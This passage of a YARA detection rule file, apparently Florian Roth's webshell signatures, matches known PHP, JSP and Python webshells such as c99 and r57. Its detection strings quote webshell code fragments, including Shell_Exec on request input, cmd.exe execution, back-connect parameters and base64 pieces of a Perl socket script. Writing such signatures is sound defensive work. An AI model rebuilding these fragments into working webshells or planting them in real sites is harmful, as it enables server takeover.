WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"fichier telecharge dans \\\".good_link(\\\"./\\\".$_FILES[\\\"fic\\\"][\\\"na\" \n      $s2 = \"if(move_uploaded_file($_FILES[\\\"fic\\\"][\\\"tmp_name\\\"],good_link(\\\"./\\\".$_FI\" \n      $s3 = \"echo \\\"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s\" \n   condition: \n      1 of them\n}\n\nrule Webshell_cgi_python_py_RID3022 : DEMO SCRIPT T1059_006 T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file cgi-python.py.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:26:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1059_006, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"a CGI by Fuzzyman\" \n      $s1 = \"\\\"\\\"\\\"+fontline +\\\"Version : \\\" + versionstring + \\\"\\\"\\\", Running on : \\\"\\\"\\\" + \" \n      $s2 = \"values = map(lambda x: x.value, theform[field])     # allows for\" \n   condition: \n      1 of them\n}\n\nrule Webshell_ru24_post_sh_php_php_RID32A0 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file ru24_post_sh.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:13:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<title>Ru24PostWebShell - \\\".$_POST['cmd'].\\\"</title>\" fullword\n      $s3 = \"if ((!$_POST['cmd']) || ($_POST['cmd']==\\\"\\\")) { $_POST['cmd']=\\\"id;pwd;uname -a\" \n      $s4 = \"Writed by DreAmeRz\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_DTool_Pro_php_RID2FBF : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file DTool Pro.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:10:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"r3v3ng4ns\\\\nDigite\" \n      $s1 = \"if(!@opendir($chdir)) $ch_msg=\\\"dtool: line 1: chdir: It seems that the permissi\" \n      $s3 = \"if (empty($cmd) and $ch_msg==\\\"\\\") echo (\\\"Comandos Exclusivos do DTool Pro\\\\n\" \n   condition: \n      1 of them\n}\n\nrule Webshell_php_include_w_shell_php_RID3425 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file php-include-w-shell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$dataout .= \\\"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd\" \n      $s1 = \"if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB\" \n   condition: \n      1 of them\n}\n\nrule Webshell_shell_php_php_RID300C : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file shell.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:23:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/* We have found the parent dir. We must be carefull if the parent \" fullword\n      $s2 = \"$tmpfile = tempnam('/tmp', 'phpshell');\" \n      $s3 = \"if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_cmdjsp_jsp_RID2ED3 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file cmdjsp.jsp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:31:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"// note that linux = cmd and windows = \\\"cmd.exe /c + cmd\\\" \" fullword\n      $s1 = \"Process p = Runtime.getRuntime().exec(\\\"cmd.exe /C \\\" + cmd);\" fullword\n      $s2 = \"cmdjsp.jsp\" \n      $s3 = \"michaeldaw.org\" fullword\n   condition: \n      2 of them\n}\n\nrule WEBSHELL_H4ntu_Shell_Powered_Tsoi_RID3323 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file h4ntu shell [powered by tsoi].txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:35:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2025-03-21\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"<title>h4ntu shell\" \n      $x2 = \"system(\\\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\\\");\" \n   condition: \n      filesize < 100KB and 1 of them\n}\n\nrule Webshell_MySQL_Web_Interface_Version_0_8_php_RID37DB : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file MySQL Web Interface Version 0.8.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 17:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"SooMin Kim\" \n      $s1 = \"http://popeye.snu.ac.kr/~smkim/mysql\" \n      $s2 = \"href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename\" \n      $s3 = \"<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi\" \n   condition: \n      2 of them\n}\n\nrule Webshell_simple_cmd_html_RID30D7 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file simple_cmd.html.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:57:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<title>G-Security Webshell</title>\" fullword\n      $s2 = \"<input type=TEXT name=\\\"-cmd\\\" size=64 value=\\\"<?=$cmd?>\\\" \" fullword\n      $s3 = \"<? if($cmd != \\\"\\\") print Shell_Exec($cmd);?>\" fullword\n      $s4 = \"<? $cmd = $_REQUEST[\\\"-cmd\\\"];?>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell__1_c2007_php_php_c100_php_RID3309 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files 1.txt, c2007.php.php.txt, c100.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:30:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d089e7168373a0634e1ac18c0ee00085\"\n      hash2 = \"38fd7e45f9c11a37463c3ded1c76af4c\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"<b>Changing file-mode (\\\".$d.$f.\\\"), \\\".view_perms_color($d.$f).\\\" (\\\"\" \n      $s3 = \"echo \\\"<td>&nbsp;<a href=\\\\\\\"\\\".$sql_surl.\\\"sql_act=query&sql_query=\\\".ur\" \n   condition: \n      1 of them\n}\n\nrule Webshell_nst_perl_proxy_shell_RID3325 : DEMO SCRIPT T1090 T1105 T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:35:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"17a07bb84e137b8aa60f87cd6bfab748\"\n      hash2 = \"4745d510fed4378e4b1730f56f25e569\"\n      tags = \"DEMO, SCRIPT, T1090, T1105, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i\" \n      $s1 = \"$perl_proxy_scp = \\\"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v\" \n      $s2 = \"<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input\" \n   condition: \n      1 of them\n}\n\nrule Webshell_network_php_xinfo_RID31DA : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files network.php.php.txt, xinfo.php.php.txt, nfm.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:40:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2601b6fc1579f263d2f3960ce775df70\"\n      hash2 = \"401fbae5f10283051c39e640b77e4c26\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa\" \n      $s2 = \"<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''\" \n   condition: \n      all of them\n}\n\nrule Webshell_SpecialShell_99_php_php_RID337E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:50:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3ca5886cd54d495dc95793579611f59a\"\n      hash2 = \"9c5bb5e3a46ec28039e8986324e42792\"\n      hash3 = \"09609851caa129e40b0d56e90dfc476c\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo \\\"<hr size=\\\\\\\"1\\\\\\\" noshade><b>Done!</b><br>Total time (secs.): \\\".$ft\" \n      $s3 = \"$fqb_log .= \\\"\\\\r\\\\n------------------------------------------\\\\r\\\\nDone!\\\\r\" \n   condition: \n      1 of them\n}\n\nrule Webshell_r577_php_php_SnIpEr_2_RID322A : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"911195a9b7c010f61b66439d9048f400\"\n      hash2 = \"eddf7a8fde1e50a7f2a817ef7cece24f\"\n      hash3 = \"8023394542cddf8aee5dec6072ed02b5\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"'eng_text71'=>\\\"Second commands param is:\\\\r\\\\n- for CHOWN - name of new owner o\" \n      $s4 = \"if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult\" \n   condition: \n      1 of them\n}\n\nrule Webshell_c99shell_v1_0_RID2F28 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:45:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9e9ae0332ada9c3797d6cee92c2ede62\"\n      hash2 = \"6cd50a14ea0da0df6a246a60c8f6f9c9\"\n      hash3 = \"671cad517edd254352fe7e0c7c981c39\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\\\"\" \n      $s2 = \"\\\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\\\"\" \n      $s4 = \"\\\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\\\"\" \n   condition: \n      2 of them\n}\n\nrule Webshell_r577_php_spy_RID2F1D : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:43:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"eed14de3907c9aa2550d95550d1a2d5f\"\n      hash2 = \"817671e1bdc85e04cc3440bbd9288800\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo $te.\\\"<div align=center><textarea cols=35 name=db_query>\\\".(!empty($_POST['\" \n      $s3 = \"echo sr(45,\\\"<b>\\\".$lang[$language.'_text80'].$arrow.\\\"</b>\\\",\\\"<select name=db>\" \n   condition: \n      1 of them\n}\n\nrule Webshell_c99_generic_RID2EB7 : DEMO GEN T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated \"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:26:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3ca5886cd54d495dc95793579611f59a\"\n      hash2 = \"9c5bb5e3a46ec28039e8986324e42792\"\n      hash3 = \"d8ae5819a0a2349ec552cbcf3a62c975\"\n      tags = \"DEMO, GEN, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"  if ($copy_unset) {foreach($sess_data[\\\"copy\\\"] as $k=>$v) {unset($sess_data[\\\"\" \n      $s1 = \"  if (file_exists($mkfile)) {echo \\\"<b>Make File \\\\\\\"\\\".htmlspecialchars($mkfile\" \n      $s2 = \"  echo \\\"<center><b>MySQL \\\".mysql_get_server_info().\\\" (proto v.\\\".mysql_get_pr\" \n      $s3 = \"  elseif (!fopen($mkfile,\\\"w\\\")) {echo \\\"<b>Make File \\\\\\\"\\\".htmlspecialchars($m\" \n   condition: \n      all of them\n}\n\nrule Webshell_SpecialShell_99a_RID3091 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated \"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3ca5886cd54d495dc95793579611f59a\"\n      hash2 = \"9c5bb5e3a46ec28039e8986324e42792\"\n      hash3 = \"d8ae5819a0a2349ec552cbcf3a62c975\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$sess_data[\\\"cut\\\"] = array(); c99_s\" \n      $s3 = \"if ((!eregi(\\\"http://\\\",$uploadurl)) and (!eregi(\\\"https://\\\",$uploadurl))\" \n   condition: \n      1 of them\n}\n\nrule Webshell_SpecialShell_99b_RID3092 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:45:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9c5bb5e3a46ec28039e8986324e42792\"\n      hash2 = \"09609851caa129e40b0d56e90dfc476c\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\"<td>&nbsp;<a href=\\\\\\\"\\\".$sql_surl.\\\"sql_act=query&sql_query=\\\".ur\" \n      $s2 = \"c99sh_sqlquery\" \n   condition: \n      1 of them\n}\n\nrule Webshell_SpecialShell_99c_RID3093 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:45:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3ca5886cd54d495dc95793579611f59a\"\n      hash2 = \"9c5bb5e3a46ec28039e8986324e42792\"\n      hash3 = \"6cd50a14ea0da0df6a246a60c8f6f9c9\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"else {$act = \\\"f\\\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA\" \n      $s3 = \"else {echo \\\"<b>File \\\\\\\"\\\".$sql_getfile.\\\"\\\\\\\":</b><br>\\\".nl2br(htmlspec\" \n   condition: \n      1 of them\n}\n\nrule WEBSHEL_PHP_Generic_Mar14_RID2F62 : DEMO GEN T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects PHP webshell\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:54:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-05-12\"\n      hash1 = \"f51a5c5775d9cca0b137ddb28ff3831f4f394b7af6f6a868797b0df3dcdb01ba\"\n      hash2 = \"ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92\"\n      hash3 = \"9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c\"\n      tags = \"DEMO, GEN, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo sr(15,\\\"<b>\\\".$lang[$language.'_text\" \n      $s1 = \".$arrow.\\\"</b>\\\",in('text','\" \n   condition: \n      2 of them\n}\n\nrule Webshell_r577_php_php_SnIpEr_RID3199 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:29:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"911195a9b7c010f61b66439d9048f400\"\n      hash2 = \"eddf7a8fde1e50a7f2a817ef7cece24f\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash',\" fullword\n      $s1 = \"$name='ec371748dc2da624b35a4f8f685dd122'\" \n      $s2 = \"rst.void.ru\" \n   condition: \n      3 of them\n}\n\nrule Webshell_Spy_r57_RID2D1F : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files r577.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 10:18:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8023394542cddf8aee5dec6072ed02b5\"\n      hash2 = \"eed14de3907c9aa2550d95550d1a2d5f\"\n      hash3 = \"817671e1bdc85e04cc3440bbd9288800\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo ws(2).$lb.\\\" <a\" \n      $s1 = \"$sql = \\\"LOAD DATA INFILE \\\\\\\"\\\".$_POST['test3_file']\" \n      $s3 = \"if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\\\"dir\\\"):(\\\"l\" \n   condition: \n      2 of them\n}\n\nrule Webshell_SpecialShell_99_php_php_c100_php_RID3678 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 16:57:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"44542e5c3e9790815c49d5f9beffbbf2\"\n      hash2 = \"09609851caa129e40b0d56e90dfc476c\"\n      hash3 = \"38fd7e45f9c11a37463c3ded1c76af4c\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if(eregi(\\\"./shbd $por\\\",$scan))\" \n      $s1 = \"$_POST['backconnectip']\" \n      $s2 = \"$_POST['backcconnmsg']\" \n   condition: \n      1 of them\n}\n\nrule Webshell_r577_php_RID2D62 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 10:29:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"eddf7a8fde1e50a7f2a817ef7cece24f\"\n      hash2 = \"8023394542cddf8aee5dec6072ed02b5\"\n      hash3 = \"eed14de3907c9aa2550d95550d1a2d5f\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if(rmdir($_POST['mk_name']))\" \n      $s2 = \"$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>\" \n      $s3 = \"if(unlink($_POST['mk_name'])) echo \\\"<table width=100% cellpadding=0 cell\" \n   condition: \n      2 of them\n}\n\nrule Webshell_SpecialShell_99_php_c_RID3299 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:12:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9c5bb5e3a46ec28039e8986324e42792\"\n      hash2 = \"6cd50a14ea0da0df6a246a60c8f6f9c9\"\n      hash3 = \"09609851caa129e40b0d56e90dfc476c\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\"ext_avi\\\"=>array(\\\"ext_avi\\\",\\\"ext_mov\\\",\\\"ext_mvi\" \n      $s1 = \"echo \\\"<b>Execute file:</b><form action=\\\\\\\"\\\".$surl.\\\"\\\\\\\" method=POST><inpu\" \n      $s2 = \"\\\"ext_htaccess\\\"=>array(\\\"ext_htaccess\\\",\\\"ext_htpasswd\" \n   condition: \n      1 of them\n}\n\nrule Webshell_multiple_php_webshells_RID33E1 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files multiple_php_webshells\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:06:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"911195a9b7c010f61b66439d9048f400\"\n      hash2 = \"be0f67f3e995517d18859ed57b4b4389\"\n      hash3 = \"eddf7a8fde1e50a7f2a817ef7cece24f\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI\" \n      $s2 = \"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0\" \n      $s4 = \"A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg\" \n   condition: \n      2 of them\n}\n\nrule Webshell_c99madshell_v2_RID2FCC : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3ca5886cd54d495dc95793579611f59a\"\n      hash2 = \"9c5bb5e3a46ec28039e8986324e42792\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<b>Dumped! Dump has been writed to \" \n      $s1 = \"if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \\\"<TABLE st\" \n      $s2 = \"<input type=submit name=actarcbuff value=\\\\\\\"Pack buffer to archive\" \n   condition: \n      1 of them\n}\n\nrule Webshell_c99madshell_v2_1_RID305C : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:36:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3ca5886cd54d495dc95793579611f59a\"\n      hash2 = \"9c5bb5e3a46ec28039e8986324e42792\"\n      hash3 = \"d8ae5819a0a2349ec552cbcf3a62c975\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@ini_set(\\\"highlight\" fullword\n      $s1 = \"echo \\\"<b>Result of execution this PHP-code</b>:<br>\\\";\" fullword\n      $s2 = \"{$row[] = \\\"<b>Owner/Group</b>\\\";}\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_GFS_web_shell_ver_3_1_7_RID32FE : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files GFS web-shell ver 3.1.7 - PRiV8.php.txt, nshell.php.php.txt, gfs_sh.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:28:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4a44d82da21438e32d4f514ab35c26b6\"\n      hash2 = \"f618f41f7ebeb5e5076986a66593afd1\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo $uname.\\\"</font><br><b>\\\";\" fullword\n      $s3 = \"while(!feof($f)) { $res.=fread($f,1024); }\" fullword\n      $s4 = \"echo 